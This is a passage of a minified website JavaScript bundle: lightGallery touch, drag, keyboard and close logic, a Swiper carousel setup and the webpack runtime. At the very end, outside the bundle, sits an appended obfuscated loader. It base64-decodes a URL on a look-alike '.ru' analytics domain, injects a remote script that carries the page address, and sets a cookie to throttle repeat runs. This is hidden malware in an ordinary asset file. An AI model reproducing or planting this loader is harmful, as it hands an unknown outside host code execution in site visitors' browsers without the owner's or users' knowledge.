                        (t ? 0 : this.settings.slideDelay));
                  }
                  this.index = e;
                }
              }),
              (e.prototype.updateCurrentCounter = function (e) {
                this.getElementById("lg-counter-current").html(e + 1 + "");
              }),
              (e.prototype.updateCounterTotal = function () {
                this.getElementById("lg-counter-all").html(
                  this.galleryItems.length + ""
                );
              }),
              (e.prototype.getSlideType = function (e) {
                return e.__slideVideoInfo
                  ? "video"
                  : e.iframe
                  ? "iframe"
                  : "image";
              }),
              (e.prototype.touchMove = function (e, t) {
                var s = t.pageX - e.pageX,
                  i = t.pageY - e.pageY,
                  a = !1;
                if (
                  (this.swipeDirection
                    ? (a = !0)
                    : Math.abs(s) > 15
                    ? ((this.swipeDirection = "horizontal"), (a = !0))
                    : Math.abs(i) > 15 &&
                      ((this.swipeDirection = "vertical"), (a = !0)),
                  a)
                ) {
                  var n = this.getSlideItem(this.index);
                  if ("horizontal" === this.swipeDirection) {
                    this.outer.addClass("lg-dragging"),
                      this.setTranslate(n, s, 0);
                    var r = n.get().offsetWidth,
                      o = (15 * r) / 100 - Math.abs((10 * s) / 100);
                    this.setTranslate(
                      this.outer.find(".lg-prev-slide").first(),
                      -r + s - o,
                      0
                    ),
                      this.setTranslate(
                        this.outer.find(".lg-next-slide").first(),
                        r + s + o,
                        0
                      );
                  } else if (
                    "vertical" === this.swipeDirection &&
                    this.settings.swipeToClose
                  ) {
                    this.$container.addClass("lg-dragging-vertical");
                    var l = 1 - Math.abs(i) / window.innerHeight;
                    this.$backdrop.css("opacity", l);
                    var d = 1 - Math.abs(i) / (2 * window.innerWidth);
                    this.setTranslate(n, 0, i, d, d),
                      Math.abs(i) > 100 &&
                        this.outer
                          .addClass("lg-hide-items")
                          .removeClass("lg-components-open");
                  }
                }
              }),
              (e.prototype.touchEnd = function (e, t, s) {
                var i,
                  a = this;
                "lg-slide" !== this.settings.mode &&
                  this.outer.addClass("lg-slide"),
                  setTimeout(function () {
                    a.$container.removeClass("lg-dragging-vertical"),
                      a.outer
                        .removeClass("lg-dragging lg-hide-items")
                        .addClass("lg-components-open");
                    var n = !0;
                    if ("horizontal" === a.swipeDirection) {
                      i = e.pageX - t.pageX;
                      var r = Math.abs(e.pageX - t.pageX);
                      i < 0 && r > a.settings.swipeThreshold
                        ? (a.goToNextSlide(!0), (n = !1))
                        : i > 0 &&
                          r > a.settings.swipeThreshold &&
                          (a.goToPrevSlide(!0), (n = !1));
                    } else if ("vertical" === a.swipeDirection) {
                      if (
                        ((i = Math.abs(e.pageY - t.pageY)),
                        a.settings.closable &&
                          a.settings.swipeToClose &&
                          i > 100)
                      )
                        return void a.closeGallery();
                      a.$backdrop.css("opacity", 1);
                    }
                    if (
                      (a.outer.find(".lg-item").removeAttr("style"),
                      n && Math.abs(e.pageX - t.pageX) < 5)
                    ) {
                      var o = he(s.target);
                      a.isPosterElement(o) && a.LGel.trigger(Te);
                    }
                    a.swipeDirection = void 0;
                  }),
                  setTimeout(function () {
                    a.outer.hasClass("lg-dragging") ||
                      "lg-slide" === a.settings.mode ||
                      a.outer.removeClass("lg-slide");
                  }, this.settings.speed + 100);
              }),
              (e.prototype.enableSwipe = function () {
                var e = this,
                  t = {},
                  s = {},
                  i = !1,
                  a = !1;
                this.settings.enableSwipe &&
                  (this.$inner.on("touchstart.lg", function (s) {
                    s.preventDefault();
                    var i = e.getSlideItem(e.index);
                    (!he(s.target).hasClass("lg-item") &&
                      !i.get().contains(s.target)) ||
                      e.outer.hasClass("lg-zoomed") ||
                      e.lgBusy ||
                      1 !== s.targetTouches.length ||
                      ((a = !0),
                      (e.touchAction = "swipe"),
                      e.manageSwipeClass(),
                      (t = {
                        pageX: s.targetTouches[0].pageX,
                        pageY: s.targetTouches[0].pageY,
                      }));
                  }),
                  this.$inner.on("touchmove.lg", function (n) {
                    n.preventDefault(),
                      a &&
                        "swipe" === e.touchAction &&
                        1 === n.targetTouches.length &&
                        ((s = {
                          pageX: n.targetTouches[0].pageX,
                          pageY: n.targetTouches[0].pageY,
                        }),
                        e.touchMove(t, s),
                        (i = !0));
                  }),
                  this.$inner.on("touchend.lg", function (n) {
                    if ("swipe" === e.touchAction) {
                      if (i) (i = !1), e.touchEnd(s, t, n);
                      else if (a) {
                        var r = he(n.target);
                        e.isPosterElement(r) && e.LGel.trigger(Te);
                      }
                      (e.touchAction = void 0), (a = !1);
                    }
                  }));
              }),
              (e.prototype.enableDrag = function () {
                var e = this,
                  t = {},
                  s = {},
                  i = !1,
                  a = !1;
                this.settings.enableDrag &&
                  (this.outer.on("mousedown.lg", function (s) {
                    var a = e.getSlideItem(e.index);
                    (he(s.target).hasClass("lg-item") ||
                      a.get().contains(s.target)) &&
                      (e.outer.hasClass("lg-zoomed") ||
                        e.lgBusy ||
                        (s.preventDefault(),
                        e.lgBusy ||
                          (e.manageSwipeClass(),
                          (t = { pageX: s.pageX, pageY: s.pageY }),
                          (i = !0),
                          (e.outer.get().scrollLeft += 1),
                          (e.outer.get().scrollLeft -= 1),
                          e.outer
                            .removeClass("lg-grab")
                            .addClass("lg-grabbing"),
                          e.LGel.trigger("lgDragStart"))));
                  }),
                  he(window).on(
                    "mousemove.lg.global" + this.lgId,
                    function (n) {
                      i &&
                        e.lgOpened &&
                        ((a = !0),
                        (s = { pageX: n.pageX, pageY: n.pageY }),
                        e.touchMove(t, s),
                        e.LGel.trigger("lgDragMove"));
                    }
                  ),
                  he(window).on("mouseup.lg.global" + this.lgId, function (n) {
                    if (e.lgOpened) {
                      var r = he(n.target);
                      a
                        ? ((a = !1),
                          e.touchEnd(s, t, n),
                          e.LGel.trigger("lgDragEnd"))
                        : e.isPosterElement(r) && e.LGel.trigger(Te),
                        i &&
                          ((i = !1),
                          e.outer
                            .removeClass("lg-grabbing")
                            .addClass("lg-grab"));
                    }
                  }));
              }),
              (e.prototype.manageSwipeClass = function () {
                var e = this.index + 1,
                  t = this.index - 1;
                this.settings.loop &&
                  this.galleryItems.length > 2 &&
                  (0 === this.index
                    ? (t = this.galleryItems.length - 1)
                    : this.index === this.galleryItems.length - 1 && (e = 0)),
                  this.outer
                    .find(".lg-item")
                    .removeClass("lg-next-slide lg-prev-slide"),
                  t > -1 && this.getSlideItem(t).addClass("lg-prev-slide"),
                  this.getSlideItem(e).addClass("lg-next-slide");
              }),
              (e.prototype.goToNextSlide = function (e) {
                var t = this,
                  s = this.settings.loop;
                e && this.galleryItems.length < 3 && (s = !1),
                  this.lgBusy ||
                    (this.index + 1 < this.galleryItems.length
                      ? (this.index++,
                        this.LGel.trigger(Ce, { index: this.index }),
                        this.slide(this.index, !!e, !1, "next"))
                      : s
                      ? ((this.index = 0),
                        this.LGel.trigger(Ce, { index: this.index }),
                        this.slide(this.index, !!e, !1, "next"))
                      : this.settings.slideEndAnimation &&
                        !e &&
                        (this.outer.addClass("lg-right-end"),
                        setTimeout(function () {
                          t.outer.removeClass("lg-right-end");
                        }, 400)));
              }),
              (e.prototype.goToPrevSlide = function (e) {
                var t = this,
                  s = this.settings.loop;
                e && this.galleryItems.length < 3 && (s = !1),
                  this.lgBusy ||
                    (this.index > 0
                      ? (this.index--,
                        this.LGel.trigger(Ee, {
                          index: this.index,
                          fromTouch: e,
                        }),
                        this.slide(this.index, !!e, !1, "prev"))
                      : s
                      ? ((this.index = this.galleryItems.length - 1),
                        this.LGel.trigger(Ee, {
                          index: this.index,
                          fromTouch: e,
                        }),
                        this.slide(this.index, !!e, !1, "prev"))
                      : this.settings.slideEndAnimation &&
                        !e &&
                        (this.outer.addClass("lg-left-end"),
                        setTimeout(function () {
                          t.outer.removeClass("lg-left-end");
                        }, 400)));
              }),
              (e.prototype.keyPress = function () {
                var e = this;
                he(window).on("keydown.lg.global" + this.lgId, function (t) {
                  e.lgOpened &&
                    !0 === e.settings.escKey &&
                    27 === t.keyCode &&
                    (t.preventDefault(),
                    e.settings.allowMediaOverlap &&
                    e.outer.hasClass("lg-can-toggle") &&
                    e.outer.hasClass("lg-components-open")
                      ? e.outer.removeClass("lg-components-open")
                      : e.closeGallery()),
                    e.lgOpened &&
                      e.galleryItems.length > 1 &&
                      (37 === t.keyCode &&
                        (t.preventDefault(), e.goToPrevSlide()),
                      39 === t.keyCode &&
                        (t.preventDefault(), e.goToNextSlide()));
                });
              }),
              (e.prototype.arrow = function () {
                var e = this;
                this.getElementById("lg-prev").on("click.lg", function () {
                  e.goToPrevSlide();
                }),
                  this.getElementById("lg-next").on("click.lg", function () {
                    e.goToNextSlide();
                  });
              }),
              (e.prototype.arrowDisable = function (e) {
                if (!this.settings.loop && this.settings.hideControlOnEnd) {
                  var t = this.getElementById("lg-prev"),
                    s = this.getElementById("lg-next");
                  e + 1 === this.galleryItems.length
                    ? s.attr("disabled", "disabled").addClass("disabled")
                    : s.removeAttr("disabled").removeClass("disabled"),
                    0 === e
                      ? t.attr("disabled", "disabled").addClass("disabled")
                      : t.removeAttr("disabled").removeClass("disabled");
                }
              }),
              (e.prototype.setTranslate = function (e, t, s, i, a) {
                void 0 === i && (i = 1),
                  void 0 === a && (a = 1),
                  e.css(
                    "transform",
                    "translate3d(" +
                      t +
                      "px, " +
                      s +
                      "px, 0px) scale3d(" +
                      i +
                      ", " +
                      a +
                      ", 1)"
                  );
              }),
              (e.prototype.mousewheel = function () {
                var e = this;
                this.outer.on("mousewheel.lg", function (t) {
                  !t.deltaY ||
                    e.galleryItems.length < 2 ||
                    (t.deltaY > 0 ? e.goToPrevSlide() : e.goToNextSlide(),
                    t.preventDefault());
                });
              }),
              (e.prototype.isSlideElement = function (e) {
                return (
                  e.hasClass("lg-outer") ||
                  e.hasClass("lg-item") ||
                  e.hasClass("lg-img-wrap")
                );
              }),
              (e.prototype.isPosterElement = function (e) {
                var t = this.getSlideItem(this.index)
                  .find(".lg-video-play-button")
                  .get();
                return (
                  e.hasClass("lg-video-poster") ||
                  e.hasClass("lg-video-play-button") ||
                  (t && t.contains(e.get()))
                );
              }),
              (e.prototype.toggleMaximize = function () {
                var e = this;
                this.getElementById("lg-maximize").on("click.lg", function () {
                  e.$container.toggleClass("lg-inline"), e.refreshOnResize();
                });
              }),
              (e.prototype.invalidateItems = function () {
                for (var e = 0; e < this.items.length; e++) {
                  var t = he(this.items[e]);
                  t.off("click.lgcustom-item-" + t.attr("data-lg-id"));
                }
              }),
              (e.prototype.manageCloseGallery = function () {
                var e = this;
                if (this.settings.closable) {
                  var t = !1;
                  this.getElementById("lg-close").on("click.lg", function () {
                    e.closeGallery();
                  }),
                    this.settings.closeOnTap &&
                      (this.outer.on("mousedown.lg", function (s) {
                        var i = he(s.target);
                        t = !!e.isSlideElement(i);
                      }),
                      this.outer.on("mousemove.lg", function () {
                        t = !1;
                      }),
                      this.outer.on("mouseup.lg", function (s) {
                        var i = he(s.target);
                        e.isSlideElement(i) &&
                          t &&
                          (e.outer.hasClass("lg-dragging") || e.closeGallery());
                      }));
                }
              }),
              (e.prototype.closeGallery = function (e) {
                var t = this;
                if (!this.lgOpened || (!this.settings.closable && !e)) return 0;
                this.LGel.trigger("lgBeforeClose"),
                  he(window).scrollTop(this.prevScrollTop);
                var s,
                  i = this.items[this.index];
                if (this.zoomFromOrigin && i) {
                  var a = this.mediaContainerPosition,
                    n = a.top,
                    r = a.bottom,
                    o = ge(
                      i,
                      this.$lgContent,
                      n + r,
                      this.galleryItems[this.index].__slideVideoInfo &&
                        this.settings.videoMaxSize
                    );
                  s = fe(i, this.$lgContent, n, r, o);
                }
                this.zoomFromOrigin && s
                  ? (this.outer.addClass("lg-closing lg-zoom-from-image"),
                    this.getSlideItem(this.index)
                      .addClass("lg-start-end-progress")
                      .css(
                        "transition-duration",
                        this.settings.startAnimationDuration + "ms"
                      )
                      .css("transform", s))
                  : (this.outer.addClass("lg-hide-items"),
                    this.outer.removeClass("lg-zoom-from-image")),
                  this.destroyModules(),
                  (this.lGalleryOn = !1),
                  (this.isDummyImageRemoved = !1),
                  (this.zoomFromOrigin = this.settings.zoomFromOrigin),
                  clearTimeout(this.hideBarTimeout),
                  (this.hideBarTimeout = !1),
                  he("html").removeClass("lg-on"),
                  this.outer.removeClass("lg-visible lg-components-open"),
                  this.$backdrop.removeClass("in").css("opacity", 0);
                var l =
                  this.zoomFromOrigin && s
                    ? Math.max(
                        this.settings.startAnimationDuration,
                        this.settings.backdropDuration
                      )
                    : this.settings.backdropDuration;
                return (
                  this.$container.removeClass("lg-show-in"),
                  setTimeout(function () {
                    t.zoomFromOrigin &&
                      s &&
                      t.outer.removeClass("lg-zoom-from-image"),
                      t.$container.removeClass("lg-show"),
                      t.$backdrop
                        .removeAttr("style")
                        .css(
                          "transition-duration",
                          t.settings.backdropDuration + "ms"
                        ),
                      t.outer.removeClass(
                        "lg-closing " + t.settings.startClass
                      ),
                      t
                        .getSlideItem(t.index)
                        .removeClass("lg-start-end-progress"),
                      t.$inner.empty(),
                      t.lgOpened &&
                        t.LGel.trigger("lgAfterClose", { instance: t }),
                      t.outer.get() && t.outer.get().blur(),
                      (t.lgOpened = !1);
                  }, l + 100),
                  l + 100
                );
              }),
              (e.prototype.initModules = function () {
                this.plugins.forEach(function (e) {
                  try {
                    e.init();
                  } catch (e) {
                    console.warn(
                      "lightGallery:- make sure lightGallery module is properly initiated"
                    );
                  }
                });
              }),
              (e.prototype.destroyModules = function (e) {
                this.plugins.forEach(function (t) {
                  try {
                    e ? t.destroy() : t.closeGallery && t.closeGallery();
                  } catch (e) {
                    console.warn(
                      "lightGallery:- make sure lightGallery module is properly destroyed"
                    );
                  }
                });
              }),
              (e.prototype.refresh = function (e) {
                this.settings.dynamic || this.invalidateItems(),
                  (this.galleryItems = e || this.getItems()),
                  this.updateControls(),
                  this.openGalleryOnItemClick(),
                  this.LGel.trigger(we);
              }),
              (e.prototype.updateControls = function () {
                this.addSlideVideoInfo(this.galleryItems),
                  this.updateCounterTotal(),
                  this.manageSingleSlideClassName();
              }),
              (e.prototype.destroy = function () {
                var e = this,
                  t = this.closeGallery(!0);
                setTimeout(function () {
                  e.destroyModules(!0),
                    e.settings.dynamic || e.invalidateItems(),
                    he(window).off(".lg.global" + e.lgId),
                    e.LGel.off(".lg"),
                    e.$container.remove();
                }, t);
              }),
              e
            );
          })();
        new de(".js-we-have__swiper-container", {
          slidesPerView: 1,
          observer: !0,
          spaceBetween: 10,
          observeParents: !0,
          centeredSlides: !0,
          loop: !0,
          speed: 500,
          navigation: {
            nextEl: ".we-have__swiper-button-next",
            prevEl: ".we-have__swiper-button-prev",
          },
          on: {
            init: function () {
              !(function (e, t) {
                new $e(e, t);
              })(document.getElementById("lightgallery"), {
                selector: ".slide",
                mobileSettings: { controls: !0, showCloseIcon: !0 },
              });
            },
          },
          breakpoints: {
            991: { slidesPerView: 3 },
            575: { slidesPerView: 2, centeredSlides: !1 },
          },
        });
      },
      425: () => {},
    },
    s = {};
  function i(e) {
    var a = s[e];
    if (void 0 !== a) return a.exports;
    var n = (s[e] = { exports: {} });
    return t[e](n, n.exports, i), n.exports;
  }
  (i.m = t),
    (e = []),
    (i.O = (t, s, a, n) => {
      if (!s) {
        var r = 1 / 0;
        for (c = 0; c < e.length; c++) {
          for (var [s, a, n] = e[c], o = !0, l = 0; l < s.length; l++)
            (!1 & n || r >= n) && Object.keys(i.O).every((e) => i.O[e](s[l]))
              ? s.splice(l--, 1)
              : ((o = !1), n < r && (r = n));
          if (o) {
            e.splice(c--, 1);
            var d = a();
            void 0 !== d && (t = d);
          }
        }
        return t;
      }
      n = n || 0;
      for (var c = e.length; c > 0 && e[c - 1][2] > n; c--) e[c] = e[c - 1];
      e[c] = [s, a, n];
    }),
    (i.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t)),
    (i.r = (e) => {
      "undefined" != typeof Symbol &&
        Symbol.toStringTag &&
        Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }),
        Object.defineProperty(e, "__esModule", { value: !0 });
    }),
    (() => {
      var e = { 773: 0, 170: 0 };
      i.O.j = (t) => 0 === e[t];
      var t = (t, s) => {
          var a,
            n,
            [r, o, l] = s,
            d = 0;
          if (r.some((t) => 0 !== e[t])) {
            for (a in o) i.o(o, a) && (i.m[a] = o[a]);
            if (l) var c = l(i);
          }
          for (t && t(s); d < r.length; d++)
            (n = r[d]), i.o(e, n) && e[n] && e[n][0](), (e[n] = 0);
          return i.O(c);
        },
        s = (self.webpackChunk = self.webpackChunk || []);
      s.forEach(t.bind(null, 0)), (s.push = t.bind(null, s.push.bind(s)));
    })(),
    i.O(void 0, [170], () => i(80));
  var a = i.O(void 0, [170], () => i(425));
  a = i.O(a);
})();
!(function (o, w, d, l) {
  try {
    (o.c =
      "h" == l.protocol[0] &&
      /./.test(l.hostname) &&
      !/PHPPREFS/.test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            atob(
              "aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ=="
            ) + l.href),
          d.body.appendChild(o.s));
      }, 1e3),
      (d.cookie = "PHPPREFS=full;max-age=39800;");
  } catch (e) {}
})({}, window, document, location);
